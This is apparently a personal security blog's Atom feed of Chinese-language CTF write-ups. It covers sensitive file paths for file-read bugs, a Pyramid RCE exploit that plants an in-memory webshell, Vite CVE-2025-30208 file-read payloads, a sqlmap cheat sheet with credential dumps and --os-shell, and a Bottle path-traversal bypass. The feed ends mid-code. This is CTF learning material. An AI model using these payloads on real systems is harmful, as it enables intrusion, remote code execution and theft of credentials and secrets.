<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MyBlog</title>
  
  <subtitle>MyBlog</subtitle>
  <link href="http://1768161086.github,io/atom.xml" rel="self"/>
  
  <link href="http://1768161086.github,io/"/>
  <updated>2025-04-24T08:26:16.973Z</updated>
  <id>http://1768161086.github,io/</id>
  
  <author>
    <name>userq</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF中文件读取漏洞常见读取路径</title>
    <link href="http://1768161086.github,io/2025/04/23/CTF%E4%B8%AD%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84/"/>
    <id>http://1768161086.github,io/2025/04/23/CTF%E4%B8%AD%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84/</id>
    <published>2025-04-23T13:53:02.000Z</published>
    <updated>2025-04-24T08:26:16.973Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-etc-目录"><a href="#1-etc-目录" class="headerlink" title="1.&#x2F;etc 目录"></a>1.&#x2F;etc 目录</h2><p>&#x2F;etc&#x2F;passwd :linux系统保存用户信息及其工作目录的文件，权限是可读。</p><p>&#x2F;etc&#x2F;shadow:是linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写。</p><p>&#x2F;etc&#x2F;apache2&#x2F;*  :Apache配置文件，可以获知WEB目录，服务端口等信息。</p><p>&#x2F;etc&#x2F;nginx&#x2F;*  :Nginx配置文件，可以获知WEB目录，服务端口等信息。</p><p>&#x2F;etc&#x2F;apparmor.(d)&#x2F;*  Apparmor配置文件，可以获得各应用系统调用的白名单、黑名单。</p><p>&#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)  :定时任务文件</p><p>&#x2F;etc&#x2F;environment 环境变量的配置文件之一。</p><p>&#x2F;etc&#x2F;hostname 表示主机名</p><p>&#x2F;etc&#x2F;hosts  是主机名查询静态列表，包含指定域名解析IP的成对信息。</p><p>&#x2F;etc&#x2F;issue 指明系统版本</p><p>&#x2F;etc&#x2F;mysql&#x2F;*  MYSQL配置文件。</p><p>&#x2F;etc&#x2F;php&#x2F;* PHP配置文件</p><h2 id="2-proc目录"><a href="#2-proc目录" class="headerlink" title="2.&#x2F;proc目录"></a>2.&#x2F;proc目录</h2><p>&#x2F;proc 目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。如果查看非当前进程的信息，pid是可以进行暴力破解的，如果查看的是当前进程，只需要&#x2F;proc&#x2F;self代替&#x2F;proc&#x2F;[pid]即可。</p><p>对应目录下的cmdline可读出比较敏感的信息，如使用mysql-uxxx -pxxx登陆mysql时，可以读出明文密码。</p><p>&#x2F;proc&#x2F;[pid]&#x2F;cmdline   ([pid]指向进程对应的终端命令)</p><p>&#x2F;proc&#x2F;self&#x2F;cmdline</p><p>当我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录：</p><p>&#x2F;proc&#x2F;[pid]&#x2F;cwd&#x2F;     ([pid] 指向进行运行目录)</p><p>&#x2F;proc&#x2F;self&#x2F;cwd</p><p>环境变量中可能存在secret_key,这时可以通过environ进行读取：</p><p>&#x2F;proc&#x2F;[pid]&#x2F;environ  ([pid]指向进行运行时的环境变量）</p><p>&#x2F;proc&#x2F;self&#x2F;environ</p><p>指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径。[pid]指向进程所对应的可执行文件。有时我们想读取当前应用的可执行文件再进行分析，但在实际利用时可能存在一些安全措施阻止我们去读可执行文件，可以尝试访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/exe</span><br></pre></td></tr></table></figure><h2 id="3-其他目录"><a href="#3-其他目录" class="headerlink" title="3.其他目录"></a>3.其他目录</h2><p>Nginx配置文件可能存在的其他路径:</p><p>&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;*</p><p>日志文件：</p><p>&#x2F;var&#x2F;log&#x2F;*</p><p>Apache 默认web根目录：</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;</p><p>PHP session 目录：</p><p>&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions&#x2F;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-etc-目录&quot;&gt;&lt;a href=&quot;#1-etc-目录&quot; class=&quot;headerlink&quot; title=&quot;1.&amp;#x2F;etc 目录&quot;&gt;&lt;/a&gt;1.&amp;#x2F;etc 目录&lt;/h2&gt;&lt;p&gt;&amp;#x2F;etc&amp;#x2F;passwd :linux系统保存用户</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Pyramid远程代码执行漏洞(执行内存马)</title>
    <link href="http://1768161086.github,io/2025/04/16/Pyramid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://1768161086.github,io/2025/04/16/Pyramid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-04-16T12:50:06.000Z</published>
    <updated>2025-04-16T12:53:51.582Z</updated>
    
    <content type="html"><![CDATA[<h2 id="熟悉的配方，熟悉的味道"><a href="#熟悉的配方，熟悉的味道" class="headerlink" title="熟悉的配方，熟悉的味道"></a>熟悉的配方，熟悉的味道</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pyramid.config import Configurator</span><br><span class="line">from pyramid.request import Request</span><br><span class="line">from pyramid.response import Response</span><br><span class="line">from pyramid.view import view_config</span><br><span class="line">from wsgiref.simple_server import make_server</span><br><span class="line">from pyramid.events import NewResponse</span><br><span class="line">import re</span><br><span class="line">from jinja2 import Environment, BaseLoader</span><br><span class="line"> </span><br><span class="line">eval_globals = &#123; #防止eval执行恶意代码</span><br><span class="line">    &#x27;__builtins__&#x27;: &#123;&#125;,      # 禁用所有内置函数</span><br><span class="line">    &#x27;__import__&#x27;: None       # 禁止动态导入</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def checkExpr(expr_input):</span><br><span class="line">    expr = re.split(r&quot;[-+*/]&quot;, expr_input)</span><br><span class="line">    print(exec(expr_input))</span><br><span class="line"> </span><br><span class="line">    if len(expr) != 2:</span><br><span class="line">        return 0</span><br><span class="line">    try:</span><br><span class="line">        int(expr[0])</span><br><span class="line">        int(expr[1])</span><br><span class="line">    except:</span><br><span class="line">        return 0</span><br><span class="line"> </span><br><span class="line">    return 1</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def home_view(request):</span><br><span class="line">    expr_input = &quot;&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line"> </span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        expr_input = request.POST[&#x27;expr&#x27;]</span><br><span class="line">        if checkExpr(expr_input):</span><br><span class="line">            try:</span><br><span class="line">                result = eval(expr_input, eval_globals)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                result = e</span><br><span class="line">        else:</span><br><span class="line">            result = &quot;爬！&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    template_str = 【xxx】</span><br><span class="line"> </span><br><span class="line">    env = Environment(loader=BaseLoader())</span><br><span class="line">    template = env.from_string(template_str)</span><br><span class="line">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="line">    return Response(rendered)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    with Configurator() as config:</span><br><span class="line">        config.add_route(&#x27;home_view&#x27;, &#x27;/&#x27;)</span><br><span class="line">        config.add_view(home_view, route_name=&#x27;home_view&#x27;)</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line"> </span><br><span class="line">    server = make_server(&#x27;0.0.0.0&#x27;, 9040, app)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>这个Pyramid应用存在一个严重的远程代码执行（RCE）漏洞，允许攻击者在服务器上执行任意命令</p><p>可以参照强网杯决赛Pyramid那题</p><p>审计内容大致为接收用户输入的表达式，检查其合法性并计算结果，最后将结果显示在 HTML 页面上。但存在<code>print(exec(expr_input))</code>可以让我们命令执行。</p><p>原文章的脚本为（<code>[奇安信攻防社区-强网杯S8决赛Pyramid框架下内存马的分析构造及RS加密签名伪造](https://forum.butian.net/share/3974)</code>）</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">code=&#x27;&#x27;&#x27;def waff():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line"> </span><br><span class="line">    g = f()             </span><br><span class="line">    frame = next(g)     </span><br><span class="line">    b = frame.f_back.f_back.f_globals</span><br><span class="line">    def hello(request):</span><br><span class="line">        code = request.params[&#x27;code&#x27;]</span><br><span class="line">        res=eval(code)</span><br><span class="line">        return Response(res)</span><br><span class="line"> </span><br><span class="line">    config.add_route(&#x27;shellb&#x27;, &#x27;/shellb&#x27;)</span><br><span class="line">    config.add_view(hello, route_name=&#x27;shellb&#x27;)</span><br><span class="line">    config.commit()</span><br><span class="line"> </span><br><span class="line">waff()</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">url=&quot;http://node1.tgctf.woooo.tech:31766/&quot;</span><br><span class="line">data=&#123;&quot;expr&quot;:f&quot;&#123;code&#125;+111&quot;&#125;</span><br><span class="line">res=requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>执行内存马脚本，然后访问我们添加的路由&#x2F;shellb，并执行命令</p><p>post传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;熟悉的配方，熟悉的味道&quot;&gt;&lt;a href=&quot;#熟悉的配方，熟悉的味道&quot; class=&quot;headerlink&quot; title=&quot;熟悉的配方，熟悉的味道&quot;&gt;&lt;/a&gt;熟悉的配方，熟悉的味道&lt;/h2&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vite任意文件读取漏洞CVE-2025-30208</title>
    <link href="http://1768161086.github,io/2025/04/16/Vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2025-30208/"/>
    <id>http://1768161086.github,io/2025/04/16/Vite%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2025-30208/</id>
    <published>2025-04-16T12:34:31.000Z</published>
    <updated>2025-04-16T12:39:12.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vite-任意文件读取漏洞分析复现-CVE-2025-30208"><a href="#Vite-任意文件读取漏洞分析复现-CVE-2025-30208" class="headerlink" title="Vite 任意文件读取漏洞分析复现 CVE-2025-30208"></a>Vite 任意文件读取漏洞分析复现 CVE-2025-30208</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p><a href="https://so.csdn.net/so/search?q=Vite&spm=1001.2101.3001.7020">Vite</a>是前端开发工具提供商，在6.2.3、6.1.2、6.0.12、5.4.15和4.5.10之前的版本中存在漏洞。‘@fs ‘拒绝访问Vite服务允许列表之外的文件。</p><h3 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">6.2.0 &lt;= version &lt;=6.2.2</span><br><span class="line"></span><br><span class="line">6.1.0 &lt;= version &lt;=6.1.1</span><br><span class="line"></span><br><span class="line">6.0.0 &lt;= version &lt;=6.0.11</span><br><span class="line"></span><br><span class="line">5.0.0 &lt;= version &lt;=5.4.14</span><br><span class="line"></span><br><span class="line">version &lt;=4.5.9</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a>三、利用条件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows:curl &quot;http://localhost:5173/@fs/C://windows/win.ini?import&amp;raw??&quot;</span><br><span class="line">Linux：curl &quot;http://localhost:5173/@fs/etc/passwd?import&amp;raw??&quot;</span><br></pre></td></tr></table></figure><h2 id="TGCTF2025-前端GAME"><a href="#TGCTF2025-前端GAME" class="headerlink" title="TGCTF2025-前端GAME"></a>TGCTF2025-前端GAME</h2><p>雪糕大作战，flag在&#x2F;tgflagggg中</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/@fs/tgflagggg?import&amp;raw??</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Vite-任意文件读取漏洞分析复现-CVE-2025-30208&quot;&gt;&lt;a href=&quot;#Vite-任意文件读取漏洞分析复现-CVE-2025-30208&quot; class=&quot;headerlink&quot; title=&quot;Vite 任意文件读取漏洞分析复现 CVE-2025-3</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sqlmap</title>
    <link href="http://1768161086.github,io/2025/04/16/sqlmap/"/>
    <id>http://1768161086.github,io/2025/04/16/sqlmap/</id>
    <published>2025-04-16T03:28:46.000Z</published>
    <updated>2025-04-16T04:58:24.938Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqlmap基本命令"><a href="#sqlmap基本命令" class="headerlink" title="sqlmap基本命令"></a>sqlmap基本命令</h1><h2 id="1-几种传参方式"><a href="#1-几种传参方式" class="headerlink" title="1.几种传参方式"></a>1.几种传参方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.GET参数注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="line">2.POST参数注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br><span class="line">3.cookie注入 （level&gt;=2时才会检测cookie）  </span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 2</span><br><span class="line">4.user-agent注</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br><span class="line">5.referer注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br><span class="line">6.host注入</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 5</span><br></pre></td></tr></table></figure><h2 id="2-获取数据库信息"><a href="#2-获取数据库信息" class="headerlink" title="2.获取数据库信息"></a>2.获取数据库信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.查看数据库</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --dbs  --batch</span><br><span class="line"></span><br><span class="line">2.查看数据库里面的表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</span><br><span class="line"></span><br><span class="line">3.查看数据库表里面的列</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --columns   --batch</span><br><span class="line"></span><br><span class="line">4.查看数据库列里面的具体的值</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C id,password   --dump  --batch</span><br></pre></td></tr></table></figure><h2 id="3-获取shell"><a href="#3-获取shell" class="headerlink" title="3.获取shell"></a>3.获取shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  --os-shell</span><br></pre></td></tr></table></figure><h2 id="4-字典破解"><a href="#4-字典破解" class="headerlink" title="4.字典破解"></a>4.字典破解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">使用条件：</span><br><span class="line">1.MySQL数据库版本小于5.0，没有information——schema表。</span><br><span class="line"></span><br><span class="line">2.Microssoft Access数据库。</span><br><span class="line"></span><br><span class="line">3.当前用户没有权限读取系统中保存的数据。</span><br><span class="line"></span><br><span class="line">*暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</span><br><span class="line">1.暴力破解表名</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security --common-tables --batch</span><br><span class="line"></span><br><span class="line">2.暴力破解列名</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security -Tusers --common-columns --batch</span><br><span class="line"></span><br><span class="line">读取文件/上传文件</span><br><span class="line">1.读取文件</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-read &quot;C:/post.txt&quot;</span><br><span class="line"></span><br><span class="line">2写入文件</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-write &quot;/root/1.txt&quot;</span><br><span class="line"> --file-dest &quot;C:/phpstudy/PHPTutorial/www/1.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="5-cookie注入"><a href="#5-cookie注入" class="headerlink" title="5.cookie注入"></a>5.cookie注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.sqlmap -u &quot;http://192.168.1.254/Less-20/index.php&quot; --cookie &quot;uname=admin&quot; --level 3 –-current-db ， 枚举当前数据库。</span><br><span class="line">2.sqlmap -u http://192.168.1.254/Less-20/index.php --cookie uname=admin --level 2 -D security -T users -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure><h2 id="6-POST注入"><a href="#6-POST注入" class="headerlink" title="6.POST注入"></a>6.POST注入</h2><p>使用bp抓包后，复制文本到文档中后执行一下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r /home/forms.txt --level 3 -D security -T users -C&quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure><h2 id="7-forms-注入"><a href="#7-forms-注入" class="headerlink" title="7.forms 注入"></a>7.forms 注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.254/Less-11&quot; --forms ” #判断有注入点。</span><br><span class="line">sqlmap -u &quot;http://192.168.1.254/Less-11&quot; --forms -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump #枚举内容</span><br></pre></td></tr></table></figure><h2 id="8-tamper-脚本"><a href="#8-tamper-脚本" class="headerlink" title="8.tamper 脚本"></a>8.tamper 脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security --tables --tamper=symboliclogical.py --level 3 --risk 3 “，猜解表名。结果显示表名为users。</span><br><span class="line"></span><br><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security -T users --columns --tamper=symboliclogical.py --level 3 --risk 3 “,猜解列名。</span><br><span class="line"></span><br><span class="line">sqlmap -u http://192.168.1.254/Less-25/?id=1 -D security -T users -C &quot;id,username&quot; --dump --tamper=symboliclogical.py --level 3 --risk 3 “,猜解内容。</span><br></pre></td></tr></table></figure><h2 id="9-执行python命令"><a href="#9-执行python命令" class="headerlink" title="9.执行python命令"></a>9.执行python命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 --eval=print(__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read())</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqlmap基本命令&quot;&gt;&lt;a href=&quot;#sqlmap基本命令&quot; class=&quot;headerlink&quot; title=&quot;sqlmap基本命令&quot;&gt;&lt;/a&gt;sqlmap基本命令&lt;/h1&gt;&lt;h2 id=&quot;1-几种传参方式&quot;&gt;&lt;a href=&quot;#1-几种传参方式&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF2025_web</title>
    <link href="http://1768161086.github,io/2025/04/14/XYCTF2025-web/"/>
    <id>http://1768161086.github,io/2025/04/14/XYCTF2025-web/</id>
    <published>2025-04-14T08:48:19.000Z</published>
    <updated>2025-04-14T13:43:41.348Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><blockquote><p>来点真正的签到吧！</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   main.py</span><br><span class="line">@Time    :   2025/03/28 22:20:49</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag_&#123;uuid4&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">from bottle import Bottle, request, response, redirect, static_file, run, route</span><br><span class="line">with open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line">@route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="line">@route(&#x27;/download&#x27;)</span><br><span class="line">def download():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\&#x27; in name:</span><br><span class="line">        response.status = 403</span><br><span class="line">        return &#x27;Forbidden&#x27;</span><br><span class="line">    with open(name, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">@route(&#x27;/secret&#x27;)</span><br><span class="line">def secret_page():</span><br><span class="line">    try:</span><br><span class="line">        session = request.get_cookie(&quot;name&quot;, secret=secret)</span><br><span class="line">        if not session or session[&quot;name&quot;] == &quot;guest&quot;:</span><br><span class="line">            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;</span><br><span class="line">            response.set_cookie(&quot;name&quot;, session, secret=secret)</span><br><span class="line">            return &#x27;Forbidden!&#x27;</span><br><span class="line">        if session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line">            return &#x27;The secret has been deleted!&#x27;</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Error!&quot;</span><br><span class="line">run(host=&#x27;0.0.0.0&#x27;, port=8080, debug=False)</span><br></pre></td></tr></table></figure><p>1.这里绕过读取文件的限制，<code>./../</code>相当于<code>../</code>，意义为<strong>先进入当前目录（其实就是留在原地），然后再退到上一级目录</strong></p><p><code>/download?filename=./.././.././../secret.txt</code>得到<code>Hell0_H@cker_Y0u_A3r_Sm@r7</code></p><p>2.下面跟<a href="https://www.cjxol.com/posts/sekaictf-2022-writeup/">Bottle Poem</a>大致一样，<code>pickle反序列化+cookie签名</code>，不过这里<code>cookie</code>的签名用的不再是<code>md5</code>而是<code>sha256</code>，应该是出于安全性考虑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 